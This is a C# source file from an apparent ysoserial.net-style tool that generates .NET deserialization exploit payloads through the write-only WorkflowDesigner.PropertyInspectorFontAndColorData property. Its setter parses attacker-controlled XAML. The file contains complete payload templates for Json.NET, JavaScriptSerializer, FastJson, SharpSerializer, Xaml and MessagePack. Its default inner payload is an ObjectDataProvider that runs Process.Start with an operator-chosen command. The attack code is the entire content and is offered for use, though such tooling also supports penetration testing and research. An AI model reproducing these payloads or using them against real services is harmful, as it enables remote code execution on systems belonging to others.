using System;
using System.Collections.Generic;
using System.Text;
using ysonet.Helpers;

namespace ysonet.Generators
{
    /// <summary>
    /// System.Activities.Presentation.WorkflowDesigner.PropertyInspectorFontAndColorData is a
    /// public string property with a SETTER AND NO GETTER, and the setter parses its value as
    /// WPF markup (System.Activities.Presentation.dll, decompiled):
    ///
    ///     public string PropertyInspectorFontAndColorData
    ///     {
    ///         set
    ///         {
    ///             StringReader input = new StringReader(value);
    ///             XmlReader reader = XmlReader.Create(input, new XmlReaderSettings { XmlResolver = null });
    ///             Hashtable hashtable = (Hashtable)System.Windows.Markup.XamlReader.Load(reader);
    ///             foreach (string key in hashtable.Keys)
    ///                 WorkflowDesignerColors.FontAndColorResources[key] = hashtable[key];
    ///         }
    ///     }
    ///
    /// So a serializer that can construct WorkflowDesigner (public class, public parameterless
    /// constructor) and assign that one string member hands the target a full
    /// XamlReader.Load over text the payload controls. That is the whole gadget: one type,
    /// one member, and a XAML document as its value.
    ///
    /// THREE FACTS THAT SHAPE EVERYTHING BELOW.
    ///
    /// 1. XmlResolver IS NULL, so this is NOT an XXE carrier. No external entity or DTD is
    ///    fetched. The effect is XAML OBJECT CONSTRUCTION in the deserializing process, which
    ///    is why this gadget is a BRIDGE CONSUMER: the value is whatever Xaml payload the
    ///    operator wants to carry, and the in-file default below is only the useful default.
    ///
    /// 2. THE RESULT IS CAST TO Hashtable. XamlReader.Load runs first, so a non-Hashtable root
    ///    still builds the whole graph and only then throws InvalidCastException - the effect
    ///    has already happened. The default document below nevertheless uses a Hashtable root
    ///    so the setter completes cleanly, and a bridged inner payload should do the same when
    ///    a clean return matters (see AdditionalInfo()).
    ///
    /// 3. THE CONSTRUCTOR NEEDS AN STA THREAD. WorkflowDesigner's constructor builds WPF
    ///    objects (a Grid) and creates a System.Windows.Application when the process has none,
    ///    so a plain worker thread throws before the member is ever assigned. That is a
    ///    property of the TARGET, and it is why -t routes through the shared STA self-test
    ///    (SelfTestNeedsStaThread below).
    ///
    /// WHY THE FORMATTER LIST IS SHORT, AND IT IS THE WRITE-ONLY PROPERTY THAT DECIDES IT.
    /// See SupportedFormatters() - the split is not "which serializer names types" but
    /// "which serializer discovers a member it can never read".
    ///
    /// Everything this gadget emits lives in this file: the target type name, the member name,
    /// every formatter template, the default inner XAML document and the surrogate shape the
    /// two type-name swaps serialize.
    ///
    /// This payload used to be ObjectDataProvider variant 4, then variant 3, reachable only
    /// when the OUTER formatter was already Xaml. It is a gadget of its own now, so the
    /// technique carries its own name, its own System.Activities.Presentation requirement, and
    /// the non-Xaml formatters the wrapper could never reach from inside that gadget.
    /// </summary>
    public class WorkflowDesignerGenerator : GenericGenerator
    {
        // The one place the target type is named as a resolvable identity rather than as
        // template text: the MessagePack and SharpSerializer binary type-name swaps take it as
        // a string, and nothing else needs it.
        private const string WorkflowDesignerAssemblyQualifiedName =
            "System.Activities.Presentation.WorkflowDesigner, System.Activities.Presentation, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35";

        // The version axis describes the framework the TARGET PROCESS RUNS ON: the chain is a
        // runtime XAML parse inside a property setter, not a compile-time compatibility gate.
        // System.Activities.Presentation 4.0.0.0 ships with .NET Framework 4.0; the ceiling is
        // re-earned by this gadget's own rows in PayloadsFireIntoTestSinks.
        public override GadgetFacetSet Facets()
        {
            return new GadgetFacetSet()
                .WithKinds(PayloadKind.NestedDeserialization, PayloadKind.CodeExecution)
                .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.Wpf,
                    GadgetRequirement.NetFramework)
                // System.Activities.Presentation 4.0.0.0 chain; fired on 4.8.1
                .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx481));
        }

        // The ObjectDataProvider chain this carries by default, and which the wrapper was
        // built to smuggle as text.
        public override string Finders()
        {
            return "Oleksandr Mirosh, Alvaro Munoz";
        }

        public override string Contributors()
        {
            return "Alvaro Munoz, Soroush Dalili, Dane Evans";
        }

        // Kept to two short sentences on purpose: this is the FIRST block of the interactive
        // info panel, and a long one pushes the formatter list and the category summary off
        // the visible rows. The Hashtable cast and the rest of the detail live in the class
        // header above, in docs/usage-and-examples.md, and in docs/ARCHITECTURE.md.
        public override string AdditionalInfo()
        {
            return "PropertyInspectorFontAndColorData is a write-only string whose setter runs XamlReader.Load on it (XmlResolver is null, so no XXE). The target needs System.Activities.Presentation and an STA thread.";
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTags.Bridged };
        }

        /// <summary>
        /// The inner payload is WPF markup, so the bridge takes a Xaml gadget:
        ///   ysonet.exe -g WorkflowDesigner -bgc ObjectDataProvider -f Json.NET -c calc.exe
        /// </summary>
        public override string SupportedBridgedFormatter()
        {
            return Formatters.Xaml;
        }

        /// <summary>
        /// Measured, and the deciding question is not the usual one. The sink is a property
        /// SETTER, so the split would normally be "does this serializer assign members by
        /// name" - but the member has NO GETTER, and that is a second, independent filter:
        /// a serializer that builds its member list from a read-and-write contract never sees
        /// PropertyInspectorFontAndColorData at all, names the type correctly, constructs it,
        /// and silently assigns nothing.
        ///
        /// WHAT WORKS. Xaml, Json.NET, JavaScriptSerializer, FastJson, SharpSerializerXml,
        /// SharpSerializerBinary, and both MessagePack Typeless flavours. Each one either
        /// looks the member up by name at assignment time (XAML member lookup,
        /// JavaScriptSerializer's GetProperty + GetSetMethod, SharpSerializer's
        /// PropertyDeserializer) or keeps a member whose setter exists even when its getter
        /// does not (Json.NET's JsonProperty.Writable, MessagePack's EmittableMember).
        ///
        /// WHAT DOES NOT, AND WHY - all four reasons are structural, so no document shape
        /// helps and none of them needs re-measuring for a future write-only member:
        ///
        ///   YamlDotNet - its deserializer inspects types through a READABLE-properties type
        ///     inspector, which filters on CanRead, so a write-only member is invisible to it
        ///     and the document has a key that maps to no property. Measured: it throws
        ///     ("Exception during deserialization") rather than assigning nothing quietly,
        ///     which is the better of the two failures but still a failure. Reproduced on a
        ///     write-only stand-in by WorkflowDesignerAdvertisesWhatCanReachAWriteOnlyMember,
        ///     against a Json.NET control, so the A/B is about the missing getter alone.
        ///   BinaryFormatter, SoapFormatter, LosFormatter, FsPickler - WorkflowDesigner is not
        ///     [Serializable] (Type.IsSerializable is false), so the reader rejects the type
        ///     before it creates anything.
        ///   NetDataContractSerializer, DataContractSerializer, DataContractJsonSerializer -
        ///     a POCO data contract is built from read-write members, so there is no member to
        ///     carry and no attribute to add to a framework type.
        ///   XmlSerializer - refuses a type whose only interesting member cannot be read, and
        ///     the whole type has no public read-write member to serialize either.
        /// </summary>
        public override List<string> SupportedFormatters()
        {
            return new List<string>
            {
                Formatters.JsonNet,
                Formatters.Xaml,
                Formatters.FastJson,
                Formatters.JavaScriptSerializer,
                Formatters.SharpSerializerXml,
                Formatters.SharpSerializerBinary,
                Formatters.MessagePackTypeless,
                Formatters.MessagePackTypelessLz4
            };
        }

        // The command is consumed by the INNER Xaml payload (the default one below, or the
        // bridged gadget the operator chained in), which is why this stays ShellCommand even
        // though this gadget never runs anything itself.
        public override CommandInputType CommandInput()
        {
            return CommandInputType.ShellCommand;
        }

        // Deliberately no --rawinput. That option exists for a gadget that drops the
        // OPERATOR's text straight into a template; here the only text this gadget escapes is
        // a XAML document ysonet built (or a bridged payload another generator built), and
        // turning that escaping off would emit a document no target can parse. The operator's
        // -c is escaped for the XML text node it lands in, by SplitCommand, one layer further
        // in. --rawcmd still applies as usual: it decides whether the inner ObjectDataProvider
        // runs the command through cmd /c or directly.

        // The target constructs WPF objects before the member is assigned, so the self-test
        // has to run on an STA thread or it never reaches the sink at all.
        public override bool SelfTestNeedsStaThread(string formatter, InputArgs inputArgs)
        {
            return true;
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            string innerXaml = BridgedInnerXaml();
            if (innerXaml == null)
            {
                // No bridged payload, so build the default one - and that one is the only
                // thing here that needs -c.
                RequireCommandInput(inputArgs);
                innerXaml = DefaultInnerXaml(inputArgs);
            }

            if (inputArgs != null && inputArgs.Minify)
            {
                // Shrink the inner document too, not only the outer one: it travels as a
                // single escaped string, so the outer minifier cannot see inside it.
                innerXaml = XmlMinifier.Minify(innerXaml, null, null);
            }

            return FinishHandWrittenPayload(BuildPayload(innerXaml, formatter), formatter, inputArgs);
        }

        // The payload of a chained Xaml gadget, or null when the operator chained nothing.
        // A Xaml generator returns a string; the byte form is accepted so a future producer
        // that hands over UTF-8 bytes does not silently become an empty inner document.
        private string BridgedInnerXaml()
        {
            if (BridgedPayload == null)
                return null;
            string text = BridgedPayload as string;
            if (text != null)
                return text;
            byte[] bytes = BridgedPayload as byte[];
            if (bytes != null)
                return Encoding.UTF8.GetString(bytes);
            throw new Exception(Name() + " received a bridged payload of type "
                + BridgedPayload.GetType().Name + "; it expects a " + Formatters.Xaml + " document.");
        }

        /// <summary>
        /// The default inner document: a Hashtable holding an ObjectDataProvider that calls
        /// Process.Start. Written out in full here so this gadget is readable and deletable on
        /// its own - it does not call the ObjectDataProvider generator, because what it needs
        /// is one specific XAML shape, not that gadget's whole payload set.
        ///
        /// The root is a Hashtable, not the ResourceDictionary the ObjectDataProvider gadget
        /// uses in its own inner documents, for the reason at the top of this file: the setter
        /// casts the loaded root to Hashtable, so a Hashtable is the one root that lets the
        /// setter finish without throwing after the payload has already run.
        ///
        /// ObjectDataProvider runs the method during the XAML parse (its ISupportInitialize
        /// EndInit does the initial load), so the effect happens while XamlReader.Load is still
        /// building the dictionary.
        /// </summary>
        private string DefaultInnerXaml(InputArgs inputArgs)
        {
            // The command lands in XML TEXT nodes below, so it is escaped for XML.
            inputArgs.CmdType = CommandArgSplitter.CommandType.XML;

            string methodParameters = inputArgs.HasArguments
                ? "<b:String>" + inputArgs.CmdFileName + "</b:String><b:String>" + inputArgs.CmdArguments + "</b:String>"
                : "<b:String>" + inputArgs.CmdFileName + "</b:String>";

            return @"<Hashtable xmlns=""clr-namespace:System.Collections;assembly=mscorlib"" xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml"" xmlns:b=""clr-namespace:System;assembly=mscorlib"" xmlns:c=""clr-namespace:System.Diagnostics;assembly=system"" xmlns:d=""clr-namespace:System.Windows.Data;assembly=PresentationFramework""><d:ObjectDataProvider x:Key="""" ObjectType=""{x:Type c:Process}"" MethodName=""Start""><d:ObjectDataProvider.MethodParameters>" + methodParameters + @"</d:ObjectDataProvider.MethodParameters></d:ObjectDataProvider></Hashtable>";
        }

        // One member, per formatter family. The inner XAML is escaped for the literal it lands
        // in - an XML attribute or a JSON string - which is a WIRE requirement, not an
        // encoding trick: the document above stays readable in this file and is escaped only
        // as it is written out.
        private object BuildPayload(string innerXaml, string formatter)
        {
            if (IsMessagePackTypeless(formatter))
            {
                // Never build a real WorkflowDesigner here: assigning the member IS the
                // effect, so it would run the payload inside ysonet. Serialize the surrogate
                // below and let MessagePack write the framework type's name instead.
                return MessagePackTypelessTypeSwap.SerializeAs(
                    new WorkflowDesignerSurrogate
                    {
                        PropertyInspectorFontAndColorData = innerXaml
                    },
                    WorkflowDesignerAssemblyQualifiedName,
                    IsMessagePackLz4(formatter));
            }

            if (IsFormatter(formatter, Formatters.SharpSerializerBinary))
            {
                // Same reason as MessagePack above: serialize the surrogate, then rewrite the
                // one type-name record in SharpSerializer's binary type cache.
                return SharpSerializerTypeSwap.SerializeAs(
                    new WorkflowDesignerSurrogate
                    {
                        PropertyInspectorFontAndColorData = innerXaml
                    },
                    WorkflowDesignerAssemblyQualifiedName);
            }

            if (IsFormatter(formatter, Formatters.Xaml))
            {
                // The xmlns takes an assembly NAME, not a display name, so no version or
                // public key token appears here.
                return @"<WorkflowDesigner xmlns=""clr-namespace:System.Activities.Presentation;assembly=System.Activities.Presentation"" PropertyInspectorFontAndColorData=""" + CommandArgSplitter.XmlStringAttributeEscape(innerXaml) + @"""/>";
            }

            // Every JSON template below quotes with DOUBLE quotes, so the inner document is
            // escaped with JsonDoubleQuotedStringEscape: the single-quote escape \' is not
            // legal JSON and fastJSON deletes the character it precedes.
            if (IsFormatter(formatter, Formatters.JsonNet))
            {
                return @"
{
    ""$type"":""System.Activities.Presentation.WorkflowDesigner, System.Activities.Presentation, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"",
    ""PropertyInspectorFontAndColorData"":""" + EscapeForJsonDoubleQuoted(innerXaml, false) + @"""
}";
            }

            if (IsFormatter(formatter, Formatters.JavaScriptSerializer))
            {
                return @"
{
    ""__type"":""System.Activities.Presentation.WorkflowDesigner, System.Activities.Presentation, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"",
    ""PropertyInspectorFontAndColorData"":""" + EscapeForJsonDoubleQuoted(innerXaml, false) + @"""
}";
            }

            if (IsFormatter(formatter, Formatters.FastJson))
            {
                return @"
{
    ""$types"":{
        ""System.Activities.Presentation.WorkflowDesigner, System.Activities.Presentation, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"":""1""
    },
    ""$type"":""1"",
    ""PropertyInspectorFontAndColorData"":""" + EscapeForJsonDoubleQuoted(innerXaml, false) + @"""
}";
            }

            if (IsFormatter(formatter, Formatters.SharpSerializerXml))
            {
                return @"
<Complex type=""System.Activities.Presentation.WorkflowDesigner,System.Activities.Presentation,Version=4.0.0.0,Culture=neutral,PublicKeyToken=31bf3856ad364e35"">
    <Properties>
        <Simple name=""PropertyInspectorFontAndColorData"" value=""" + CommandArgSplitter.XmlStringAttributeEscape(innerXaml) + @"""/>
    </Properties>
</Complex>";
            }

            throw UnsupportedFormatter(formatter);
        }

        // Shape only, never deserialized as itself: the MessagePack and SharpSerializer type
        // swaps rewrite this type's name to System.Activities.Presentation.WorkflowDesigner
        // before the payload leaves ysonet. It carries a getter as well as a setter because a
        // SERIALIZER has to read the value out of it - the real target's missing getter is a
        // deserialize-side concern only.
        internal sealed class WorkflowDesignerSurrogate
        {
            public string PropertyInspectorFontAndColorData { get; set; }
        }
    }
}
